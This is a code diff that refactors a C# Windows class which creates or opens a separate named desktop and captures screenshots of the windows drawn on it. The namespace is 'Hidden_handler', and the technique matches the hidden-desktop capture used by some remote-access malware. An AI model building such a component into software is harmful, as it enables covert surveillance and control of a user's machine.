@@ -1,14 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Drawing;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Hidden_handler
 {
-    class Imaging_handler
+    class Imaging_handler : IDisposable
     {
         private enum DESKTOP_ACCESS : uint
         {
@@ -23,8 +19,8 @@ namespace Hidden_handler
             DESKTOP_WRITEOBJECTS = 0x0080,
             DESKTOP_SWITCHDESKTOP = 0x0100,
             GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
-                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
-                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
+                DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
+                DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
         }
 
         private struct RECT
@@ -46,27 +42,17 @@ namespace Hidden_handler
             GW_ENABLEDPOPUP = 6
         }
 
-
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr GetDesktopWindow();
 
         [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr GetDC(IntPtr hWnd);
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern bool SetThreadDesktop(IntPtr hDesktop);
-        
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);
-
-        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
-            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
-
-
-        [DllImport("user32.dll", SetLastError = false)]
-        static extern IntPtr GetDesktopWindow();
+        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);
+        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
 
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -82,9 +68,6 @@ namespace Hidden_handler
         [DllImport("user32.dll")]
         static extern IntPtr GetTopWindow(IntPtr hWnd);
 
-        [DllImport("user32.dll")]
-        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
-
         [DllImport("gdi32.dll")]
         static extern IntPtr CreateCompatibleDC(IntPtr hdc);
 
@@ -93,9 +76,11 @@ namespace Hidden_handler
 
         [DllImport("gdi32.dll")]
         static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+
         [DllImport("gdi32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool DeleteObject(IntPtr hObject);
+
         [DllImport("gdi32.dll")]
         static extern bool DeleteDC(IntPtr hdc);
 
@@ -111,15 +96,16 @@ namespace Hidden_handler
             DESKTOPVERTRES = 117
         }
 
-        public IntPtr Desktop = IntPtr.Zero;
-        public Imaging_handler(string DesktopName) 
+        public IntPtr Desktop { get; private set; }
+
+        public Imaging_handler(string DesktopName)
         {
             IntPtr Desk = OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
             if (Desk == IntPtr.Zero)
             {
                 Desk = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
             }
-            Desktop=Desk;
+            Desktop = Desk;
         }
 
         private static float GetScalingFactor()
@@ -134,7 +120,7 @@ namespace Hidden_handler
             }
         }
 
-        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
+        private bool DrawApplication(IntPtr hWnd, Graphics modifiableScreen, IntPtr DC)
         {
             RECT r;
             bool returnValue = false;
@@ -145,13 +131,13 @@ namespace Hidden_handler
             IntPtr hBmpWindow = CreateCompatibleBitmap(DC, (int)((r.Right - r.Left) * scalingFactor), (int)((r.Bottom - r.Top) * scalingFactor));
 
             SelectObject(hDcWindow, hBmpWindow);
-            uint nflag = 2;//0, in windows below 8.1 this way not work and needs to be 0
+            uint nflag = 2; // 0, in Windows below 8.1 this way not work and needs to be 0
             if (PrintWindow(hWnd, hDcWindow, nflag))
             {
                 try
                 {
                     Bitmap processImage = Bitmap.FromHbitmap(hBmpWindow);
-                    ModifiableScreen.DrawImage(processImage, new Point(r.Left, r.Top));
+                    modifiableScreen.DrawImage(processImage, new Point(r.Left, r.Top));
                     processImage.Dispose();
                     returnValue = true;
                 }
@@ -164,7 +150,8 @@ namespace Hidden_handler
             DeleteDC(hDcWindow);
             return returnValue;
         }
-        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
+
+        private void DrawTopDown(IntPtr owner, Graphics modifiableScreen, IntPtr DC)
         {
             IntPtr currentWindow = GetTopWindow(owner);
             if (currentWindow == IntPtr.Zero)
@@ -178,26 +165,29 @@ namespace Hidden_handler
             }
             while (currentWindow != IntPtr.Zero)
             {
-                DrawHwnd(currentWindow, ModifiableScreen, DC);
+                DrawHwnd(currentWindow, modifiableScreen, DC);
                 currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDPREV);
             }
         }
-        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
+
+        private void DrawHwnd(IntPtr hWnd, Graphics modifiableScreen, IntPtr DC)
         {
             if (IsWindowVisible(hWnd))
             {
-                DrawApplication(hWnd, ModifiableScreen, DC);
+                DrawApplication(hWnd, modifiableScreen, DC);
                 if (Environment.OSVersion.Version.Major < 6)
                 {
-                    DrawTopDown(hWnd, ModifiableScreen,  DC);
+                    DrawTopDown(hWnd, modifiableScreen, DC);
                 }
             }
         }
-        public void Dispose() 
+
+        public void Dispose()
         {
             CloseDesktop(Desktop);
             GC.Collect();
         }
+
         public Bitmap Screenshot()
         {
             SetThreadDesktop(Desktop);
@@ -206,11 +196,22 @@ namespace Hidden_handler
             GetWindowRect(GetDesktopWindow(), out DesktopSize);
             float scalingFactor = GetScalingFactor();
             Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
-            Graphics ModifiableScreen = Graphics.FromImage(Screen);
-            DrawTopDown(IntPtr.Zero, ModifiableScreen, DC);
-            ModifiableScreen.Dispose();
+            using (Graphics modifiableScreen = Graphics.FromImage(Screen))
+            {
+                DrawTopDown(IntPtr.Zero, modifiableScreen, DC);
+            }
             ReleaseDC(IntPtr.Zero, DC);
             return Screen;
         }
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
+            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool SetThreadDesktop(IntPtr hDesktop);
     }
 }
